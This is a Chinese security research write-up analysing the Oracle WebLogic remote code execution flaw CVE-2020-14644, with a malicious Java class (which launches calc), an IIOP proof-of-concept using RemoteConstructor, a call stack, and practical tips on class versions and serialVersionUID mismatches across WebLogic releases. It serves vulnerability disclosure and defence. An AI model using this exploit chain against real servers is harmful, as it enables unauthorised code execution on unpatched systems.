# Weblogic 远程命令执行漏洞（CVE-2020-14644）分析

作者：白帽汇安全研究院@Sp4rr0vv

核对：白帽汇安全研究院@r4v3zn

# 0x00 概述

2020 年 7 月 15 日，Oracle 发布大量安全修复补丁，其中 CVE-2020-14644 漏洞被评分为 9.8 分，影响版本为 `12.2.1.3.0、12.2.1.4.0, 14.1.1.0.0` 。本文基于互联网公开的 POC 进行复现、分析，最终实现无任何限制的 `defineClass` + 实例化，进行实现 RCE。

# 0x01 前置知识

`JDK` 的 `ClassLoader` 类中有个方法是 `defindClass` ，可以根据类全限定名和类的字节数组，加载一个类到 `jvm` 中并返回对应的 `Class` 对象（随带一提，这种加载类的方式不会执行类初始化）。

![image-20200805135249325](https://nosec.org/avatar/uploads/attach/image/eec75b4ef9e0e8b4980ddfe22512dba6/image-20200805135249325.png)

所以只要参数 `name`（类名）和 `b` （类文件的二进制数据）可控，理论上我们可以加载任何类，需要注意的一点是，这个类名 `name` 一定要和这个类字节数组 `b` 中对于的类名一致才行，不然就是一个 `NoClassDefFoundError`

![image-20200805143407083](https://nosec.org/avatar/uploads/attach/image/030032e9d2435a7e9237d92426f5632c/image-20200805143407083.png)

![image-20200805143146631](https://nosec.org/avatar/uploads/attach/image/c69586bf5e2dfe214fbebe21b4bcec6b/image-20200805143146631.png)

# 0x02 复现

环境

- Weblogic 12.2.1.4.0
- jdk 1.8.0_112
- Windows 10

首先准备一个带包名的恶意类，在构造函数中写入恶意代码

```
package com;

import java.io.IOException;

public class EvilObj {

    public EvilObj() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            var1.printStackTrace();
        }
    }
}
```

POC

```
ClassIdentity classIdentity = new ClassIdentity( EvilObj.class);
ClassPool cp = ClassPool.getDefault();
CtClass ctClass = cp.get(EvilObj.class.getName());
ctClass.replaceClassName(EvilObj.class.getName(),  EvilObj.class.getName() + "$" + classIdentity.getVersion());
RemoteConstructor constructor = new RemoteConstructor(
        new ClassDefinition(classIdentity, ctClass.toBytecode()),
        new ob ject[] {}
);
// 发送 IIOP 协议数据包
Context context = getContext("iiop://ip:port");
context.rebind("hello",constructor);
```

复现结果：

![image-20200806093842214](https://nosec.org/avatar/uploads/attach/image/97ef8d5118d7f823a1d2fa93b5db540f/image-20200806093842214.png)

以下为简化版调用栈：

```
exec:347, Runtime (java.lang)
<init>:14, SimpleMapEntry$7E80A4E3098E7FB7B109472C77D1D573 (com.tangosol.util)
newInvokeSpecial__L:-1, 1565249093 (java.lang.invoke.LambdaForm$DMH)
reinvoke:-1, 1641862114 (java.lang.invoke.LambdaForm$BMH)
invoker:-1, 222055923 (java.lang.invoke.LambdaForm$MH)
invokeExact_MT:-1, 1593074896 (java.lang.invoke.LambdaForm$MH)
invokeWithArguments:627, MethodHandle (java.lang.invoke)
createInstance:149, ClassDefinition (com.tangosol.internal.util.invoke)
realize:142, RemotableSupport (com.tangosol.internal.util.invoke)
newInstance:122, RemoteConstructor (com.tangosol.internal.util.invoke)
readResolve:233, RemoteConstructor (com.tangosol.internal.util.invoke)
```

# 0x03 实际利用

综述，整体的思路为，构造一个带有包名类，恶意代码写进构造函数中就行，然后通过 `javassist` 进行动态修改类名，将原类名追加 `$` 和 `version` 值，在实战利用中可能会出现以下问题。

## 3.1 为啥要带包名？

因为`ClassIdentity`的构造函数中有下面这个链式调用，不带包名`getPackage()`会返回`null`，再往下调用就会空指针异常

![image-20200806094554771](https://nosec.org/avatar/uploads/attach/image/8838e71b0a6f06424378b5a05db8a3db/image-20200806094554771.png)

## 3.2 Class 版本问题

在利用的过程中常常会出现，由于 JDK 版本问题无法正常利用问题。

1. 可以通过在编译获取恶意类时加入 `-source 1.6 -target 1.6` 参数指定编译版本。
2. 也可通过设置当前运行 jdk 版本调整为最低版本进行使用。

# 0x04 序列化 ID 问题

由于 Weblogic 版本的变化，`coherence.jar` 文件中的 `serialVersionUID` 可能会出现不一致的问题，通过分析测试得出以下结论 `12.2.1.3.0` 与 `12.2.1.4.0`、`14.1.1.0.0` 的 `serialVersionUID` 不同，以下为详细测试的结果：

| coherence.jar | weblogic 版本 | 是否成功 |
| :------------ | :------------ | :------- |
| 12.2.1.3.0    | 12.2.1.3.0    | 成功     |
| 12.2.1.3.0    | 12.2.1.4.0    | 失败     |
| 12.2.1.3.0    | 14.1.1.0.0    | 失败     |
| 12.2.1.4.0    | 12.2.1.3.0    | 失败     |
| 12.2.1.4.0    | 12.2.1.4.0    | 成功     |
| 12.2.1.4.0    | 14.1.1.0.0    | 成功     |
| 14.1.1.0.0    | 12.2.1.3.0    | 失败     |
| 14.1.1.0.0    | 12.2.1.4.0    | 成功     |
| 14.1.1.0.0    | 14.1.1.0.0    | 成功     |

该问题可通过 `URLClassLoader` 进行动态加载处理以下为部分核心代码（摘自 `weblogic-fr amework`）：

![image-20200806133258369](https://nosec.org/avatar/uploads/attach/image/e2e3a9f84f6bdc37928df0aaa39593a0/image-20200806133258369.png)

![image-20200806133919212](https://nosec.org/avatar/uploads/attach/image/06d75c55d590d48d6eccca8576f861dc/image-20200806133919212.png)

# 0x05 参考

- [CVE-2020-14644 分析与 gadget 的一些思考](https://paper.seebug.org/1281/)
- https://www.oracle.com/security-alerts/cpujul2020.html


<br/>

<br/>
**[Goby 官网: https://gobysec.net/](https://gobysec.net/)** 

如果您有任何反馈建议，您可通过提交 issue 或是以下方式联系我们：

1. GitHub issue: [https://github.com/gobysec/Goby/issues](https://github.com/gobysec/Goby/issues)
2. 微信群：关注公众号“GobySec“，回复暗号”加群“ （社群优势：可第一时间了解Goby功能发布、活动等咨询）
3. Telegram Group: [http://t.me/gobies](http://t.me/gobies) 
4. 推特：[https://twitter.com/GobySec](https://twitter.com/GobySec)
